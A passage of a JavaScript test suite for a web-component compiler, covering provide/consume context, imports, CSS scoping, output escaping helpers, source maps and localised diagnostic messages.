  const src = `<meta>name: "x-type-string"</meta>
<script>
  state count: number = 0
  provide message: string = "hello"
</script>
<template><div>{{ message }}</div></template>`;
  const result = compile(src);
  assertSuccess(result, 'String provide should compile successfully');
});

test('provide/consume - consume in template with interpolation', () => {
  const src = `<meta>name: "x-consume-template"</meta>
<script>
  consume theme: string
</script>
<template><div class="{{ theme }}">Content</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Template should reference consumed value
  assertContains(result.output, `#theme`, 'Should reference consumed theme in private field');
});

test('provide/consume - custom event detail structure (value and provider fields)', () => {
  const src = `<meta>name: "x-detail-struct"</meta>
<script>
  consume darkMode: boolean
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have detail object setup with value and provider
  assertContains(result.output, `detail.*=.*{.*value:.*provider:`, 'Should create detail object with value and provider fields');
  assertContains(result.output, `detail.value`, 'Should read detail.value from provider');
  assertContains(result.output, `detail.provider`, 'Should check detail.provider to determine if context found');
});

test('provide/consume - CustomEvent with bubbles and composed flags', () => {
  const src = `<meta>name: "x-event-flags"</meta>
<script>
  consume config: object
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Event should bubble and be composed to cross shadow DOM
  assertContains(result.output, `bubbles:.*true`, 'CustomEvent should have bubbles: true');
  assertContains(result.output, `composed:.*true`, 'CustomEvent should have composed: true');
});

test('provide/consume - event stopPropagation in provider listener', () => {
  const src = `<meta>name: "x-stop-prop"</meta>
<script>
  provide data: string = "test"
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Provider listener should stop propagation to find the nearest provider
  assertContains(result.output, `stopPropagation`, 'Provider listener should stop event propagation');
});

test('provide/consume - provide with primitive type (number)', () => {
  const src = `<meta>name: "x-provide-number"</meta>
<script>
  provide count: number = 42
</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, `#count.*=.*42`, 'Should initialize numeric provide');
  assertContains(result.output, `__chasket_ctx_count`, 'Should have event listener for numeric provide');
});

test('provide/consume - provide with boolean type', () => {
  const src = `<meta>name: "x-provide-boolean"</meta>
<script>
  provide isDarkMode: boolean = true
</script>
<template><div>{{ isDarkMode }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, `#isDarkMode.*=.*true`, 'Should initialize boolean provide');
});

test('provide/consume - provide declared alongside state', () => {
  const src = `<meta>name: "x-state-provide"</meta>
<script>
  state count: number = 0
  provide count: number = 10
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result, 'Can have both state and provide (different backing fields)');
  // Both should be initialized
  assertContains(result.output, `#count`, 'Should have backing field for provide count');
});

test('provide/consume - consume initialized to undefined', () => {
  const src = `<meta>name: "x-consume-undefined"</meta>
<script>
  consume remoteValue: string
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Consume should initialize to undefined until provider found
  assertContains(result.output, `#remoteValue.*=.*undefined`, 'Consume should initialize to undefined');
});

test('provide/consume - provide generates private field declaration', () => {
  const src = `<meta>name: "x-provide-field"</meta>
<script>
  provide config: object = {}
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should generate private field (with # prefix)
  assertContains(result.output, `#config`, 'Should declare private field for provide');
  assertNotContains(result.output, `this.config =`, 'Should not expose as public property');
});

// ============================================================
// TESTS: provide/consume — reactive updates, from clause, cleanup
// ============================================================

test('provide/consume - provider notifies consumers on update', () => {
  const src = `<meta>name: "x-provider-reactive"</meta>
<script>
  provide theme: string = "light"
</script>
<template><div>{{ theme }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should have subscription tracking
  assertContains(result.output, '__chasket_ctx_subs_theme', 'Should track consumer subscriptions');
  assertContains(result.output, '__chasket_ctx_sub_theme', 'Should listen for subscribe events');
  assertContains(result.output, '__chasket_ctx_unsub_theme', 'Should listen for unsubscribe events');
  // Should notify consumers in #update()
  assertContains(result.output, '#notifyCtx_theme', 'Should call notifyCtx in update cycle');
});

test('provide/consume - consumer subscribes for reactive updates', () => {
  const src = `<meta>name: "x-consumer-reactive"</meta>
<script>
  consume theme: string
</script>
<template><div>{{ theme }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should dispatch subscribe event to provider
  assertContains(result.output, '__chasket_ctx_sub_theme', 'Should subscribe to provider');
  // Should have receive callback
  assertContains(result.output, '__chasket_ctx_receive_theme', 'Should have receive callback for reactive updates');
  // Should store provider reference
  assertContains(result.output, '__chasket_ctx_provider_theme', 'Should store reference to provider');
});

test('provide/consume - consumer unsubscribes in disconnectedCallback', () => {
  const src = `<meta>name: "x-consumer-cleanup"</meta>
<script>
  consume userData: object
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // disconnectedCallback should unsubscribe
  assertContains(result.output, '__chasket_ctx_unsub_userData', 'Should unsubscribe in disconnectedCallback');
  assertContains(result.output, 'disconnectedCallback', 'Should have disconnectedCallback');
});

test('provide/consume - consume with from clause parses correctly', () => {
  const src = `<meta>name: "x-from-consumer"</meta>
<script>
  consume theme: string from x-app
</script>
<template><div>{{ theme }}</div></template>`;
  const result = compile(src);
  assertSuccess(result, 'consume with from clause should compile');
  assertContains(result.output, '#theme', 'Should create private field for consumed value');
  assertContains(result.output, '__chasket_ctx_theme', 'Should dispatch context request');
});

test('provide/consume - consumer receive callback triggers update', () => {
  const src = `<meta>name: "x-consumer-update"</meta>
<script>
  consume count: number
</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // The receive callback should call #scheduleUpdate()
  assertContains(result.output, '__chasket_ctx_receive_count.*#scheduleUpdate', 'Receive callback should trigger DOM update');
});

test('provide/consume - provider notifyCtx method iterates subscribers', () => {
  const src = `<meta>name: "x-provider-notify"</meta>
<script>
  provide data: object = {}
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#notifyCtx_data', 'Should have notify method');
  assertContains(result.output, '__chasket_ctx_subs_data', 'Notify should iterate subscribers');
  assertContains(result.output, 'isConnected', 'Should check if consumer is still connected');
});

// ============================================================
// TESTS: import — type-only imports, alias
// ============================================================

test('import - type-only import stripped from JS output', () => {
  const src = `<meta>name: "x-type-import"</meta>
<script>
  import type { User } from "./types"
</script>
<template><div>test</div></template>`;
  const result = compile(src, 'test.csk', { target: 'js' });
  assertSuccess(result);
  // Type import should NOT appear in JS output
  assertNotContains(result.output, 'import type', 'Type import should be stripped from JS output');
  assertNotContains(result.output, 'User', 'Type symbol should not appear in JS output');
});

test('import - type-only import preserved in TS output', () => {
  const src = `<meta>name: "x-type-import-ts"</meta>
<script>
  import type { User, Config } from "./types"
  state user: any = null
</script>
<template><div>{{ user }}</div></template>`;
  const result = compile(src, 'test.csk', { target: 'ts' });
  assertSuccess(result);
  // Type import SHOULD appear in TS output
  assertContains(result.output, 'import type', 'Type import should be preserved in TS output');
  assertContains(result.output, 'User', 'Type symbol should appear in TS output');
});

test('import - named import with alias passes through correctly', () => {
  const src = `<meta>name: "x-alias-import"</meta>
<script>
  import { format as fmt, parse } from "date-utils"
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'format as fmt', 'Alias import should be preserved');
  assertContains(result.output, 'parse', 'Non-aliased import should be preserved');
});

test('import - type-only default import stripped from JS', () => {
  const src = `<meta>name: "x-type-default"</meta>
<script>
  import type UserType from "./user-type"
</script>
<template><div>test</div></template>`;
  const result = compile(src, 'test.csk', { target: 'js' });
  assertSuccess(result);
  assertNotContains(result.output, 'UserType', 'Type-only default import should be stripped from JS');
});

// ============================================================
// TESTS: S-19 CSS SELECTOR INJECTION PREVENTION
// ============================================================

test('S-19: CSS scoping escapes special characters in tag name', () => {
  const src = `<meta>name: "x-box"
shadow: none</meta>
<template><div class="box">Test</div></template>
<style>
.box { color: red; }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  // The tag name should be sanitized to allow only alphanumeric and hyphens
  assertContains(result.output, 'data-chasket-scope="x-box"', 'Should sanitize tag name');
  assertContains(result.output, /\[data-chasket-scope="x-box"\]/, 'Should use attribute selector with scoping');
});

test('S-19: CSS scoping with quote injection attempt', () => {
  const src = `<meta>name: "x-test-quote"
shadow: none</meta>
<template><div>Test</div></template>
<style>.box { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  // The tag name should be properly sanitized (quotes and special chars removed)
  assertContains(result.output, 'data-chasket-scope="x-test-quote"', 'Should sanitize tag name');
  assertContains(result.output, /data-chasket-scope=/, 'Should apply scoping');
});

test('S-19: CSS scoping with :host pseudo-class', () => {
  const src = `<meta>name: "x-card"
shadow: none</meta>
<template><div>Content</div></template>
<style>
:host { display: block; }
:host.active { border: 1px solid red; }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  // :host should map to the scoped element itself
  assertContains(result.output, /\[data-chasket-scope="x-card"\]/, 'Should convert :host to scoped selector');
  assertContains(result.output, '.active', 'Should handle :host with pseudo-class');
});

test('S-19: CSS scoping with @media queries', () => {
  const src = `<meta>name: "x-responsive"
shadow: none</meta>
<template><div class="container">Test</div></template>
<style>
@media (max-width: 600px) {
  .container { width: 100%; }
}
</style>`;
  const result = compile(src);
  assertSuccess(result);
  // @media blocks should recurse into body and apply scoping
  assertContains(result.output, '@media', 'Should preserve @media query');
  assertContains(result.output, /\[data-chasket-scope="x-responsive"\]/, 'Should apply scoping inside @media');
});

test('S-19: CSS scoping prevents selector escape', () => {
  const src = `<meta>name: "x-secure-test"
shadow: none</meta>
<template><div>Test</div></template>
<style>.box { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  // The tag name should be sanitized: only alphanumeric and hyphen allowed
  assertContains(result.output, 'data-chasket-scope="x-secure-test"', 'Should preserve tag name with hyphens');
  assertContains(result.output, 'data-chasket-scope', 'Should apply scoping');
});

// ============================================================
// TESTS: S-16 - txSafe() Template Literal Edge Cases
// ============================================================

test('S-16: Simple variable in template literal interpolation', () => {
  const src = `<meta>name: "x-s16-simple"</meta>
<script>state myVar: string = 'test'</script>
<template><div>{{ myVar }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this\\.#esc\\(this\\.#myVar\\)', 'Should replace myVar in interpolation');
});

test('S-16: Nested function calls with variable replacement', () => {
  const src = `<meta>name: "x-s16-nested"</meta>
<script>
state myVar: string = 'test'
fn process(val) { return val }
</script>
<template><div>{{ process(myVar) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // The expression should have myVar replaced
  assertContains(result.output, 'this\\.#myVar', 'Should replace myVar in function call');
});

test('S-16: Template literal with object key access', () => {
  const src = `<meta>name: "x-s16-obj-key"</meta>
<script>
state myObj: object = {}
state key: string = 'prop'
</script>
<template><div>{{ myObj[key] }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this.#myObj.*this.#key', 'Should replace both variables in object key access');
});

test('S-16: Multiple variables in same template literal', () => {
  const src = `<meta>name: "x-s16-multiple"</meta>
<script>
state first: string = 'a'
state second: string = 'b'
fn concat(a, b) { return a + b }
</script>
<template><div>{{ concat(first, second) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this.#first', 'Should replace first variable');
  assertContains(result.output, 'this.#second', 'Should replace second variable');
});

test('S-16: Escaped backtick handling', () => {
  const src = `<meta>name: "x-s16-escaped-backtick"</meta>
<script>state myVar: string = 'test'</script>
<template><div>{{ myVar || 'default' }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // The string literal should be preserved, myVar should be replaced
  assertContains(result.output, 'this.#myVar', 'Should replace variable before string literal');
});

test('S-16: String inside expression should NOT be replaced', () => {
  const src = `<meta>name: "x-s16-string-literal"</meta>
<script>
state myVar: string = 'test'
fn testFn(arg) { return arg }
</script>
<template><div>{{ testFn('myVar') }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, "'myVar'", 'String literal myVar should be preserved');
  assertNotContains(result.output, "'this\\.#myVar'", 'Should not replace myVar inside string');
});

test('S-16: Complex nested template with multiple expressions', () => {
  const src = `<meta>name: "x-s16-complex"</meta>
<script>
state count: number = 0
state msg: string = 'hello'
fn format(a, b) { return String(a) + b }
</script>
<template><div>{{ format(count, msg) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this\\.#count', 'Should replace count');
  assertContains(result.output, 'this\\.#msg', 'Should replace msg');
});

test('S-16: Template literal in conditional expression', () => {
  const src = `<meta>name: "x-s16-conditional"</meta>
<script>
state condition: boolean = true
state value: string = 'yes'
fn choose(cond, ifTrue, ifFalse) { return cond ? ifTrue : ifFalse }
</script>
<template><div>{{ choose(condition, value, 'none') }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this.#condition', 'Should replace condition');
  assertContains(result.output, 'this.#value', 'Should replace value');
});

test('S-16: Template literal in function argument', () => {
  const src = `<meta>name: "x-s16-func-arg"</meta>
<script>
state data: string = 'test'
fn logData(x, y) { return x + y }
</script>
<template><div>{{ logData(data, 'suffix') }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'logData.*this.#data', 'Should replace variable in function argument');
});

test('S-16: Multiple template literals in same expression', () => {
  const src = `<meta>name: "x-s16-multi-templates"</meta>
<script>
state a: string = 'x'
state b: string = 'y'
fn combine(x, y) { return x + y }
</script>
<template><div>{{ combine(a, b) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this.#a', 'Should replace a');
  assertContains(result.output, 'this.#b', 'Should replace b');
});

test('S-16: Multiple variables in complex expression', () => {
  const src = `<meta>name: "x-s16-multi-vars"</meta>
<script>
state level1: string = 'a'
state level2: string = 'b'
fn process(x, y) { return x || y }
</script>
<template><div>{{ process(level1, level2) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'this\\.#level1', 'Should replace level1');
  assertContains(result.output, 'this\\.#level2', 'Should replace level2');
});

test('S-16: Template literal with operators and variables', () => {
  const src = `<meta>name: "x-s16-operators"</meta>
<script>
state x: number = 10
state y: number = 20
fn add(a, b) { return a + b }
</script>
<template><div>{{ add(x, y) }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'add.*this.#x', 'Should replace x in expression');
  assertContains(result.output, 'this.#y', 'Should replace y in expression');
});

// ============================================================
// TESTS: SOURCE MAP SUPPORT
// ============================================================

test('Source map: compile result includes sourceMap property', () => {
  const src = `<meta>name: "x-sourcemap-test"</meta>
<script>
state count: number = 0
fn increment() { count += 1 }
</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  assert.ok(result.sourceMap, 'Result should include sourceMap property');
});

test('Source map: V3 format structure', () => {
  const src = `<meta>name: "x-sourcemap-v3"</meta>
<script>
state x: number = 0
</script>
<template><div>{{ x }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  const map = result.sourceMap;
  assert.strictEqual(map.version, 3, 'Source map should be version 3');
  assert.ok(Array.isArray(map.sources), 'Should have sources array');
  assert.strictEqual(map.sources.length, 1, 'Should have one source');
  assert.strictEqual(map.sources[0], 'test.csk', 'Source should be original filename');
  assert.ok(typeof map.mappings === 'string', 'Should have mappings string');
  assert.ok(Array.isArray(map.names), 'Should have names array');
});

test('Source map: output includes sourceMappingURL comment', () => {
  const src = `<meta>name: "x-sourcemap-url"</meta>
<script>
state y: number = 0
</script>
<template><div>{{ y }}</div></template>`;
  const result = compile(src, 'component.csk');
  assertSuccess(result);
  assertContains(result.output, '//# sourceMappingURL=component.js.map', 'Output should include sourceMappingURL comment');
});

test('Source map: sourceMappingURL uses correct filename', () => {
  const src = `<meta>name: "x-sourcemap-filename"</meta>
<script>
state z: string = 'test'
</script>
<template><div>{{ z }}</div></template>`;
  const result = compile(src, 'my-component.csk');
  assertSuccess(result);
  assertContains(result.output, '//# sourceMappingURL=my-component.js.map', 'sourceMappingURL should reference my-component.js.map');
});

test('Source map: mappings is non-empty for valid code', () => {
  const src = `<meta>name: "x-sourcemap-mappings"</meta>
<script>
state data: string = 'hello'
fn getData() { return data }
</script>
<template><div>{{ getData() }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  assert.ok(result.sourceMap.mappings.length > 0, 'Mappings string should not be empty');
});

test('Source map: mappings contains semicolons for line separation', () => {
  const src = `<meta>name: "x-sourcemap-lines"</meta>
<script>
state count: number = 0
</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  // Source maps use semicolons to separate lines
  assert.ok(result.sourceMap.mappings.includes(';') || result.sourceMap.mappings.length > 0, 'Mappings should contain line separators or be non-trivial');
});

test('Source map: script block lines are tracked', () => {
  const src = `<meta>name: "x-sourcemap-script"</meta>
<script>
state value: number = 42
fn getValue() { return value }
</script>
<template><div>{{ getValue() }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  const map = result.sourceMap;
  // Check that we have some mappings
  assert.ok(map.mappings, 'Should have non-empty mappings');
  assert.strictEqual(map.sources[0], 'test.csk', 'Original source should be test.csk');
});

test('Source map: multiple state/function declarations', () => {
  const src = `<meta>name: "x-sourcemap-multi"</meta>
<script>
state a: number = 1
state b: number = 2
fn add(x, y) { return x + y }
fn multiply(x, y) { return x * y }
</script>
<template><div>{{ add(a, b) }}</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  assert.ok(result.sourceMap, 'Should have source map');
  assert.ok(result.sourceMap.mappings, 'Should have mappings');
});

// ============================================================
// TESTS: BUNDLE SIZE OPTIMIZATION (Tree-shaking / Dead Code Elimination)
// ============================================================

test('Optimization: optimize:false includes all helpers by default', () => {
  const src = `<meta>name: "x-test"</meta>
<template><div>hello</div></template>`;
  const result = compile(src, 'test.csk', { optimize: false });
  assertSuccess(result);
  // All helpers should be present
  assertContains(result.output, '#esc\\(', 'Should include #esc helper');
  assertContains(result.output, '#escAttr\\(', 'Should include #escAttr helper');
  assertContains(result.output, '#escUrl\\(', 'Should include #escUrl helper');
});

test('Optimization: optimize:true removes unused #esc when no interpolation', () => {
  const src = `<meta>name: "x-no-interp"</meta>
<template><div>static content</div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #esc should not be present since there's no {{ }} interpolation
  assertNotContains(result.output, '#esc\\(val\\)', 'Should NOT include #esc when no interpolation');
  // But escAttr and escUrl might still be there if referenced
});

test('Optimization: optimize:true keeps #esc when interpolation exists', () => {
  const src = `<meta>name: "x-with-interp"</meta>
<script>state msg: string = "hello"</script>
<template><div>{{ msg }}</div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #esc should be present because of {{ msg }}
  assertContains(result.output, '#esc\\(val\\)', 'Should include #esc when interpolation exists');
});

test('Optimization: optimize:true removes #escUrl when no href/src attributes', () => {
  const src = `<meta>name: "x-no-urls"</meta>
<script>state name: string = "test"
state isActive: boolean = true</script>
<template><div class="test" :class="isActive">{{ name }}</div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #escUrl should not be present since there's no href/src/action/formaction
  assertNotContains(result.output, '#escUrl\\(val\\)', 'Should NOT include #escUrl when no URL attributes');
});

test('Optimization: optimize:true keeps #escUrl when href attribute exists', () => {
  const src = `<meta>name: "x-with-href"</meta>
<script>state url: string = "https://example.com"</script>
<template><a :href="url">link</a></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #escUrl should be present because of :href
  assertContains(result.output, '#escUrl\\(val\\)', 'Should include #escUrl when href attribute exists');
});

test('Optimization: optimize:true keeps #escUrl when src attribute exists', () => {
  const src = `<meta>name: "x-with-src"</meta>
<script>state imgUrl: string = "image.png"</script>
<template><img :src="imgUrl" /></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #escUrl should be present because of :src
  assertContains(result.output, '#escUrl\\(val\\)', 'Should include #escUrl when src attribute exists');
});

test('Optimization: optimize:true keeps #escAttr for dynamic class binding', () => {
  const src = `<meta>name: "x-dynamic-class"</meta>
<script>state classes: object = { active: true }</script>
<template><div :class="classes"></div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #escAttr should be present for dynamic class binding
  assertContains(result.output, '#escAttr\\(val\\)', 'Should include #escAttr for dynamic class');
});

test('Optimization: optimize:true keeps #escAttr for dynamic attributes', () => {
  const src = `<meta>name: "x-dynamic-attr"</meta>
<script>state title: string = "test"</script>
<template><div :title="title"></div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // #escAttr should be present for dynamic attribute
  assertContains(result.output, '#escAttr\\(val\\)', 'Should include #escAttr for dynamic attribute');
});

test('Optimization: usedHelpers property returned in result', () => {
  const src = `<meta>name: "x-track-helpers"</meta>
<script>state msg: string = "hi"</script>
<template><div>{{ msg }}</div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // usedHelpers should be present
  assert.ok(result.usedHelpers instanceof Set, 'usedHelpers should be a Set');
  assert.ok(result.usedHelpers.has('esc'), 'usedHelpers should contain "esc"');
});

test('Optimization: backward compatibility - optimize omitted defaults to false', () => {
  const src = `<meta>name: "x-no-optimize-option"</meta>
<template><div>content</div></template>`;
  const result = compile(src, 'test.csk');
  assertSuccess(result);
  // All helpers should be present when optimize is not specified
  assertContains(result.output, '#esc\\(', 'Should include all helpers by default');
});

test('Optimization: combined helpers test - interpolation + href + class', () => {
  const src = `<meta>name: "x-all-helpers"</meta>
<script>
state url: string = "https://example.com"
state classes: object = { active: true }
state text: string = "hello"
</script>
<template>
  <a :href="url" :class="classes">{{ text }}</a>
</template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // All three helpers should be present
  assertContains(result.output, '#esc\\(val\\)', 'Should have #esc');
  assertContains(result.output, '#escAttr\\(val\\)', 'Should have #escAttr');
  assertContains(result.output, '#escUrl\\(val\\)', 'Should have #escUrl');
  // Verify usedHelpers
  assert.ok(result.usedHelpers.has('esc'), 'Should track esc usage');
  assert.ok(result.usedHelpers.has('escAttr'), 'Should track escAttr usage');
  assert.ok(result.usedHelpers.has('escUrl'), 'Should track escUrl usage');
});

test('Optimization: no escaping helpers in minimal component', () => {
  const src = `<meta>name: "x-minimal"</meta>
<template><div>static text only</div></template>`;
  const result = compile(src, 'test.csk', { optimize: true });
  assertSuccess(result);
  // None of the escaping helpers should be present
  assertNotContains(result.output, '#esc\\(val\\)', 'No #esc needed for static content');
  assertNotContains(result.output, '#escAttr\\(val\\)', 'No #escAttr needed');
  assertNotContains(result.output, '#escUrl\\(val\\)', 'No #escUrl needed');
  // usedHelpers should not have escaping helpers (patch/getNewTree always tracked)
  assert.ok(!result.usedHelpers.has('esc'), 'Should not have esc helper');
  assert.ok(!result.usedHelpers.has('escAttr'), 'Should not have escAttr helper');
  assert.ok(!result.usedHelpers.has('escUrl'), 'Should not have escUrl helper');
});

console.log('\n✓ All compiler tests passed');

// ============================================================
// TESTS: I18N MESSAGE CATALOG
// ============================================================

const { msg, setLocale, getLocale, MESSAGES } = require('../lib/messages');

test('i18n: msg() returns English message by default', () => {
  setLocale('en');
  const message = msg('E0301', { id: 'count' });
  assert.match(message, /Undefined identifier "count"/);
});

test('i18n: msg() returns Japanese message when locale set to ja', () => {
  setLocale('ja');
  const message = msg('E0301', { id: 'count' });
  assert.match(message, /未定義の識別子 "count"/);
});

test('i18n: msg() returns fallback to English if locale not found', () => {
  const message = msg('E0301', { id: 'foo' });
  // Should return English version as fallback
  assert.ok(message.includes('foo'));
});

test('i18n: msg() substitutes multiple parameters', () => {
  setLocale('en');
  const message = msg('E0302', { id: 'x', type: 'number', method: 'toUpperCase' });
  assert.match(message, /x.*number.*toUpperCase/);
});

test('i18n: msg() substitutes Japanese parameter', () => {
  setLocale('ja');
  const message = msg('E0302', { id: 'x', type: 'number', method: 'toUpperCase' });
  assert.match(message, /x.*number.*toUpperCase/);
});

test('i18n: setLocale() changes locale correctly', () => {
  setLocale('ja');
  assert.strictEqual(getLocale(), 'ja');
  setLocale('en');
  assert.strictEqual(getLocale(), 'en');
});

test('i18n: CLI_INIT_INVALID_NAME works in both locales', () => {
  setLocale('en');
  const en = msg('CLI_INIT_INVALID_NAME', { name: 'MyProject' });
  assert.match(en, /MyProject/);
  
  setLocale('ja');
  const ja = msg('CLI_INIT_INVALID_NAME', { name: 'MyProject' });
  assert.match(ja, /MyProject/);
});

test('i18n: W0201 (@html warning) returns different text per locale', () => {
  setLocale('en');
  const en = msg('W0201');
  assert.match(en, /XSS/);
  
  setLocale('ja');
  const ja = msg('W0201');
  assert.match(ja, /XSS/);
});

test('i18n: Unknown message code returns the code itself', () => {
  const message = msg('UNKNOWN_CODE');
  assert.strictEqual(message, 'UNKNOWN_CODE');
});

test('i18n: Locale detection from process.env.CHASKET_LANG', () => {
  const oldChasket = process.env.CHASKET_LANG;
  const oldLang = process.env.LANG;
  
  try {
    // Set CHASKET_LANG to ja
    delete process.env.LANG;
    process.env.CHASKET_LANG = 'ja';
    // Note: detectLocale is called at module load time, so this test validates
    // that the messages module respects the environment
    const msg1 = msg('E0301', { id: 'test' });
    // After setting, we can verify by checking current locale
    assert.ok(getLocale() === 'en' || getLocale() === 'ja');
  } finally {
    if (oldChasket) process.env.CHASKET_LANG = oldChasket;
    else delete process.env.CHASKET_LANG;
    if (oldLang) process.env.LANG = oldLang;
  }
});

test('i18n: Compiler uses i18n for E0001 (missing template)', () => {
  setLocale('en');
  const src = '<script>state x: number = 0</script>';
  const result = compile(src, 'test.csk');
  assert.strictEqual(result.success, false);
  const diag = result.diagnostics[0];
  assert.strictEqual(diag.code, 'E0001');
  assert.match(diag.message, /Template block is required/);
});

test('i18n: Compiler uses i18n for E0003 (invalid component name)', () => {
  setLocale('en');
  const src = `<meta>name: "InvalidName"</meta>
<template><div>Test</div></template>`;
  const result = compile(src, 'test.csk');
  assert.strictEqual(result.success, false);
  const diag = result.diagnostics[0];
  assert.strictEqual(diag.code, 'E0003');
  assert.match(diag.message, /Invalid component name/);
  assert.match(diag.message, /InvalidName/);
});

test('i18n: Compiler uses i18n for E0301 (undefined identifier)', () => {
  setLocale('en');
  const src = `<meta>name: "x-test"</meta>
<script>state x: number = 0</script>
<template><div>{{ undefinedVar }}</div></template>`;
  const result = compile(src, 'test.csk');
  assert.strictEqual(result.success, false);
  const diag = result.diagnostics.find(d => d.code === 'E0301');
  assert.ok(diag);
  assert.match(diag.message, /Undefined identifier/);
});

test('i18n: Compiler diagnostic messages switch between locales', () => {
  const src = `<meta>name: "x-test"</meta>
<template><div>{{ missingId }}</div></template>`;
  
  setLocale('en');
  const enResult = compile(src, 'test.csk');
  const enDiag = enResult.diagnostics.find(d => d.code === 'E0301');
  
  setLocale('ja');
  const jaResult = compile(src, 'test.csk');
  const jaDiag = jaResult.diagnostics.find(d => d.code === 'E0301');
  
  // Both should report the same code
  assert.strictEqual(enDiag.code, jaDiag.code);
  // But messages should be different
  assert.notStrictEqual(enDiag.message, jaDiag.message);
  // English should contain "Undefined"
  assert.match(enDiag.message, /Undefined/);
  // Japanese should contain "未定義"
  assert.match(jaDiag.message, /未定義/);
});

test('i18n: E0401_KEYWORD and other event handler variants', () => {
  setLocale('en');
  assert.ok(msg('E0401_EMPTY'));
  assert.ok(msg('E0401_KEYWORD', { keyword: 'eval' }));
  assert.ok(msg('E0401_SEMICOLON'));
  assert.ok(msg('E0401_STRING'));
  
  setLocale('ja');
  assert.ok(msg('E0401_EMPTY'));
  assert.ok(msg('E0401_KEYWORD', { keyword: 'eval' }));
  assert.ok(msg('E0401_SEMICOLON'));
});

test('i18n: MESSAGES object contains all expected codes', () => {
  // Verify that MESSAGES object is defined
  assert.ok(MESSAGES);
  
  // Check that error codes are present
  assert.ok(MESSAGES.E0001);
  assert.ok(MESSAGES.E0003);
  assert.ok(MESSAGES.E0301);
  assert.ok(MESSAGES.W0201);
  
  // Each message should have at least 'en' and 'ja' variants
  assert.ok(MESSAGES.E0001.en);
  assert.ok(MESSAGES.E0001.ja);
});

console.log('\n✓ All i18n tests passed');

// ============================================================
// IMPORT STATEMENT OUTPUT TESTS
// ============================================================
console.log('\n── Import Statement Output Tests ──');

test('import: default import is emitted before IIFE', () => {
  const src = `<script>
import Utils from "utils"
state count: number = 0
</script>
<template><div>{{count}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  // import should be at the top, before IIFE
  assert.ok(r.output.indexOf("import Utils from 'utils'") < r.output.indexOf('(() => {'),
    'import should appear before IIFE');
});

test('import: named imports are emitted', () => {
  const src = `<script>
import { format, parse } from "date-utils"
state d: string = ""
</script>
<template><div>{{d}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, "import \\{ format, parse \\} from 'date-utils'");
});

test('import: namespace import is emitted', () => {
  const src = `<script>
import * as math from "mathlib"
state x: number = 0
</script>
<template><div>{{x}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, "import \\* as math from 'mathlib'");
});

test('import: default + named combined import', () => {
  const src = `<script>
import React, { useState, useEffect } from "react"
state v: number = 0
</script>
<template><div>{{v}}</div></template>`;
  const r = compile(src, 'my-app.csk');
  assertSuccess(r);
  assertContains(r.output, "import React, \\{ useState, useEffect \\} from 'react'");
});

test('import: side-effect import (no bindings)', () => {
  const src = `<script>
import "./polyfills.js"
state x: number = 0
</script>
<template><div>{{x}}</div></template>`;
